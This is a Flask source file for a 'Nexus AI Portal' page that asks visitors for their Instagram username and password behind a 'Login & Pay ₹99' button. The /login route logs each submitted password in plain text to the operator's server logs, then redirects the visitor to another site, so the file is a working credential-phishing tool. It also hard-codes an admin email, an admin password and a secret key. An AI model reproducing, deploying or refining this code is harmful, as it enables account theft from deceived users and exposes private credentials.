import os
from flask import Flask, render_template_string, request

app = Flask(__name__)
app.secret_key = "nexus_final_fix_2026"

# --- ADMIN DETAILS ---
ADMIN_GMAIL = "nexusai119@gmail.com"
ADMIN_PASSWORD = "prashant@123456"

# --- PORTAL DESIGN ---
HTML_LAYOUT = """
<!DOCTYPE html>
<html>
<head>
    <title>Nexus AI Portal</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        body { background: #0f172a; color: white; font-family: sans-serif; text-align: center; padding-top: 50px; }
        .card { background: #1e293b; display: inline-block; padding: 30px; border-radius: 15px; border: 2px solid #38bdf8; width: 300px; box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
        h2 { color: #38bdf8; margin-bottom: 20px; }
        input { display: block; width: 90%; padding: 12px; margin: 15px auto; border-radius: 8px; border: 1px solid #334155; background: #0f172a; color: white; }
        button { background: #38bdf8; color: #0f172a; border: none; padding: 12px; border-radius: 8px; cursor: pointer; font-weight: bold; width: 100%; transition: 0.3s; }
        button:hover { background: #7dd3fc; }
        .admin-link { display: block; margin-top: 20px; color: #94a3b8; font-size: 12px; text-decoration: none; }
    </style>
</head>
<body>
    <div class="card">
        <h2>🚀 Nexus AI Portal</h2>
        <form method="POST" action="/login">
            <input type="text" name="insta_id" placeholder="Instagram ID" required>
            <input type="password" name="insta_pass" placeholder="Password" required>
            <button type="submit">Login & Pay ₹99</button>
        </form>
        <a href="/admin" class="admin-link">🛡️ Admin Access</a>
    </div>
</body>
</html>
"""

@app.route('/')
def home():
    return render_template_string(HTML_LAYOUT)

@app.route('/login', methods=['POST'])
def login():
    # Ye data aapke Render Logs mein dikhega
    user_id = request.form.get('insta_id')
    user_pw = request.form.get('insta_pass')
    print(f"--- NEW DATA RECEIVED ---")
    print(f"ID: {user_id} | PASS: {user_pw}")
    return "<h1>Redirecting to Payment...</h1><script>setTimeout(()=>{window.location.href='https://nexus-ai-yjm5.onrender.com'}, 3000);</script>"

@app.route('/admin')
def admin():
    return f"<h1>Admin Panel</h1><p>Welcome Prashant. Logs are being recorded.</p>"

# --- RENDER PORT FIX ---
if __name__ == "__main__":
    port = int(os.environ.get("PORT", 10000))
    app.run(host='0.0.0.0', port=port)
